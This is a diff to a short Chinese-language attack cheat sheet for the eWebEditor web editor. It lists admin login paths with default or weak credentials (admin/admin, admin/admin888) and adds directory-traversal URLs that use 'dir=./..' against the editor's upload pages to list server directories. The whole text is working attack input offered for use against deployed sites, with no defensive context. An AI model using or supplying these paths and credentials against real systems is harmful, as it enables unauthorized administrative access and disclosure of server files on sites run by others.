@@ -1,8 +1,7 @@
-
+# 弱口令
 ```
 ewebeditor-v2
 
-弱口令
 /ewebeditor/admin_login.asp?action=login
 
 用户名: admin 密码: admin
@@ -29,4 +28,13 @@ ewebeditor-v12
 用户名: admin 密码: admin
 用户名: admin 密码: admin888
 
+```
+# 列目录
+
+```
+/admin/ewebeditor/admin/upload.asp?id=16&d_viewmode=&dir=./..
+
+/admin/editor/uploadfile.asp?id=16&d_viewmode=&dir=./..
+
+/admin/ewebeditor/admin/editor/uploadfile.asp?id=16&d_viewmode=&dir=./..
 ```
